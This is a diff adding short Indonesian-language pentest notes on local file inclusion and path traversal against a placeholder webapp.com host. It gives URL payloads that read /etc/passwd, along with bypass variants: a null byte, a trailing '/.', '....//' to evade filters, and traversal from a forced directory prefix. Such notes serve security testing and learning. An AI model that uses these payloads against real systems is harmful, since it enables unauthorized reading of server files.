@@ -1,0 +1,29 @@
+biasanya pwd akan ada di /var/www/...
+
+bisa path traversal dengan
+```
+http*://webapp.com/get.php?file=../../../../etc/passwd
+```
+
+jika saat LFI tetep diminta `.php`, tambahkan `%00` atau `/.`
+```
+http*://webapp.com/get.php?file=../../../../etc/passwd%00
+
+http*://webapp.com/get.php?file=../../../../etc/passwd/.
+```
+
+jika saat LFI terjadi error karena keywords filtering gunakan `....//`
+```
+http*://webapp.com/get.php?file=....//....//....//....//etc/passwd
+```
+
+jika saat LFI, ternyata developer memaksa include dari direktori yang sudah terdefined.
+contoh jika webapp ask untuk supply input yang harus memasukkan direktori seperti
+```
+http*://webapp.com/index.php?lang=languages/EN.php
+```
+
+maka kita perlu untuk memasukkan direktori tersebut ke payload, jadinya
+```
+http*://webapp.com/index.php?lang=languages/../../../../../etc/passwd
+```
